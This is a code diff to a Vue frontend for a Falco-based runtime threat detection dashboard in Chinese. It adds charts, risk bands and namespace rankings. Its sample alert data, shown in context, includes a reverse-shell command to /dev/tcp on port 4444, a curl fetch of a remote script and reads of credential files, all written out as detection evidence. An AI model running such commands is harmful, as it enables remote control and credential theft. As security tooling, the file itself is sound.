@@ -143,6 +143,32 @@ const behaviorCategories = [
   { title: '敏感数据保护', icon: 'password', risk: '高危' as Severity, hits: 67, focus: '凭证与身份文件访问', desc: '持续监控 /etc/shadow、/etc/passwd、SSH 密钥、API 凭证等高价值敏感文件访问。', vectors: ['/etc/shadow 与 /etc/passwd 访问', 'SSH 私钥读取', 'API Token 与云凭证访问'] },
 ];
 
+const behaviorTrendSeries = [
+  { label: '容器安全', color: '#1d4ed8', points: [18, 24, 21, 35, 42, 38, 31, 46, 55, 49, 62, 58, 71, 64] },
+  { label: '主机安全', color: '#f97316', points: [12, 15, 19, 22, 28, 34, 29, 31, 36, 41, 39, 44, 47, 42] },
+  { label: '网络威胁', color: '#059669', points: [21, 18, 26, 33, 31, 27, 35, 44, 48, 46, 52, 61, 57, 68] },
+  { label: '敏感数据', color: '#dc2626', points: [6, 8, 11, 9, 15, 13, 18, 16, 21, 20, 24, 29, 26, 31] },
+];
+
+const behaviorRiskBands = [
+  { label: '高危', value: 37, percent: 38, tone: 'danger' },
+  { label: '中危', value: 84, percent: 46, tone: 'warning' },
+  { label: '低危', value: 62, percent: 16, tone: 'info' },
+];
+
+const behaviorNamespaceRanks = [
+  { name: 'pay-prod', owner: '支付业务组', count: 18, percent: 92 },
+  { name: 'data-prod', owner: '数据平台组', count: 14, percent: 74 },
+  { name: 'ops', owner: '运维工具组', count: 9, percent: 53 },
+  { name: 'security', owner: '平台安全组', count: 7, percent: 41 },
+];
+
+const behaviorRuleHitsTop = [
+  { rule: 'Terminal shell in container', hits: 86, layer: '容器安全' },
+  { rule: 'Unexpected listening port', hits: 64, layer: '网络威胁' },
+  { rule: 'Read sensitive credential file', hits: 52, layer: '敏感数据保护' },
+];
+
 const behaviorEvents = [
   {
     id: 'FB-9001', time: '2026-05-08 10:24:18', layer: '容器安全', vector: '容器内 shell 会话创建', asset: 'namespace/pay-prod · pod/pay-api-6d79', rule: 'Terminal shell in container', level: '高危' as Severity, evidence: 'proc.name=bash user=root container.image=registry.local/pay-api:v2.7 command=bash -i', action: '已隔离 Pod 并保留容器快照', status: '阻断中', confidence: 98, owner: '支付业务组', node: 'node-cn-bj-cce-03', namespace: 'pay-prod', pod: 'pay-api-6d79c8d9f4-k2x7q', containerId: 'cri-o://8f42d1c3b7e9', image: 'registry.local/pay-api:v2.7@sha256:9f31c4', runtime: 'containerd 1.7.18', user: 'root', pid: 18422, parentPid: 18290, parentProcess: 'nginx: worker process', childProcesses: ['bash -i', 'cat /etc/passwd', 'curl 198.51.100.23/p.sh'], commandLine: 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1', cwd: '/app', tty: 'pts/0', processTree: [{ name: 'containerd-shim', pid: 18110, depth: 0 }, { name: 'nginx: worker process', pid: 18290, depth: 1 }, { name: 'bash -i', pid: 18422, depth: 2 }, { name: 'curl 198.51.100.23/p.sh', pid: 18431, depth: 3 }], evidenceFields: ['evt.type=execve', 'container.id=8f42d1c3b7e9', 'proc.name=bash', 'user.name=root', 'fd.rip=198.51.100.23'], suggestion: '立即隔离 Pod，保留容器快照，核查镜像入口脚本与最近一次发布差异。'
@@ -339,6 +365,10 @@ function sparkline(points: number[], width = 300, height = 120) {
     const y = height - ((point - min) / Math.max(max - min, 1)) * (height - 18) - 9;
     return `${index * step},${y}`;
   }).join(' ');
+}
+
+function percent(value: number, total: number) {
+  return Math.round((value / Math.max(total, 1)) * 100) + '%';
 }
 
 function levelClass(level: Severity) {
@@ -679,13 +709,55 @@ function testSmtp() {
       </section>
 
 <section v-if="activePage === 'behavior'" class="page-stack threat-behavior-page formal-behavior-page">
-        <div class="soc-header-card">
-          <div class="soc-header-main"><span class="soc-kicker"><AppIcon name="behavior" size="16" /> Falco Runtime Detection</span><h2>威胁行为检测</h2><p>基于容器运行时、宿主机系统调用、网络连接与敏感文件访问证据，识别云原生环境中的异常进程、横向移动、违规外联和凭证访问风险。</p></div>
-          <div class="soc-header-actions"><button class="white-button" @click="showToast('已刷新威胁行为检测事件与规则命中统计')"><AppIcon name="refresh" size="15" /> 刷新事件</button><button class="blue-button" @click="showToast('已下发 Falco 规则同步任务')"><AppIcon name="rules" size="15" /> 同步规则</button><button class="white-button" @click="showToast('已导出威胁行为检测证据包')"><AppIcon name="download" size="15" /> 导出证据</button></div>
+        <div class="behavior-command-center">
+          <div class="soc-header-card behavior-compact-header">
+            <div class="soc-header-main"><span class="soc-kicker"><AppIcon name="behavior" size="16" /> Falco Runtime Detection</span><h2>威胁行为检测</h2><p>基于容器运行时、宿主机系统调用、网络连接与敏感文件访问证据，构建“指标—趋势—证据—处置”的运行时安全运营闭环。</p></div>
+            <div class="soc-header-actions"><button class="white-button" @click="showToast('已刷新威胁行为检测事件与规则命中统计')"><AppIcon name="refresh" size="15" /> 刷新事件</button><button class="blue-button" @click="showToast('已下发 Falco 规则同步任务')"><AppIcon name="rules" size="15" /> 同步规则</button><button class="white-button" @click="showToast('已导出威胁行为检测证据包')"><AppIcon name="export" size="15" /> 导出证据</button></div>
+          </div>
+
+          <div class="behavior-kpi-strip">
+            <article v-for="stat in behaviorStats" :key="stat.label" :data-tone="stat.tone">
+              <div class="kpi-top"><span><AppIcon :name="stat.icon" :label="stat.label" /></span><small>近24小时</small></div>
+              <p>{{ stat.label }}</p><strong>{{ stat.value }}</strong><em>{{ stat.delta }}</em>
+            </article>
+          </div>
         </div>
 
-        <div class="behavior-kpi-grid formal-kpis">
-          <article v-for="stat in behaviorStats" :key="stat.label" :data-tone="stat.tone"><span><AppIcon :name="stat.icon" :label="stat.label" /></span><div><p>{{ stat.label }}</p><strong>{{ stat.value }}</strong><em>{{ stat.delta }}</em></div></article>
+        <div class="behavior-analytics-grid">
+          <section class="panel behavior-trend-panel">
+            <div class="panel-title-row compact"><div><h3>威胁行为趋势</h3><p>近 24 小时四类运行时事件命中走势</p></div><span class="tag info">实时聚合</span></div>
+            <div class="behavior-trend-wrap">
+              <svg class="behavior-trend-chart" viewBox="0 0 520 168" preserveAspectRatio="none" role="img" aria-label="威胁行为趋势图">
+                <line v-for="y in [28, 70, 112, 154]" :key="y" x1="0" :y1="y" x2="520" :y2="y" class="chart-grid-line" />
+                <polyline v-for="series in behaviorTrendSeries" :key="series.label" :points="sparkline(series.points, 520, 168)" class="behavior-trend-line" :style="{ '--line-color': series.color }" />
+              </svg>
+              <div class="trend-axis"><span>00:00</span><span>06:00</span><span>12:00</span><span>18:00</span><span>现在</span></div>
+            </div>
+            <div class="trend-legend"><span v-for="series in behaviorTrendSeries" :key="series.label"><i :style="{ background: series.color }"></i>{{ series.label }}</span></div>
+          </section>
+
+          <section class="panel layer-distribution-panel">
+            <div class="panel-title-row compact"><div><h3>检测层面分布</h3><p>按 Falco 规则域统计命中量</p></div><strong>426</strong></div>
+            <article v-for="category in behaviorCategories" :key="category.title" class="layer-meter-row">
+              <div><span :class="behaviorLayerClass(category.title.replace('层', ''))"><AppIcon :name="category.icon" size="15" /> {{ category.title }}</span><b>{{ category.hits }}</b></div>
+              <div class="meter-track"><i :style="{ width: percent(category.hits, 426) }"></i></div>
+            </article>
+          </section>
+
+          <section class="panel risk-radar-panel">
+            <div class="panel-title-row compact"><div><h3>风险等级分布</h3><p>高危事件优先进入隔离与工单流程</p></div></div>
+            <div class="risk-donut"><strong>37</strong><span>高危事件</span></div>
+            <div class="risk-band-list"><article v-for="band in behaviorRiskBands" :key="band.label" :data-tone="band.tone"><div><b>{{ band.label }}</b><em>{{ band.value }} 起</em></div><span><i :style="{ width: band.percent + '%' }"></i></span></article></div>
+          </section>
+
+          <section class="panel workload-rank-panel">
+            <div class="panel-title-row compact"><div><h3>受影响命名空间</h3><p>按工作负载风险密度排序</p></div><span class="tag warning">Top 4</span></div>
+            <article v-for="item in behaviorNamespaceRanks" :key="item.name" class="workload-rank-row">
+              <div><b>{{ item.name }}</b><span>{{ item.owner }}</span><em>{{ item.count }} 起</em></div>
+              <span class="rank-track"><i :style="{ width: item.percent + '%' }"></i></span>
+            </article>
+            <div class="rule-hit-mini"><span v-for="rule in behaviorRuleHitsTop" :key="rule.rule"><b>{{ rule.hits }}</b>{{ rule.rule }}</span></div>
+          </section>
         </div>
 
         <div class="behavior-workbench">
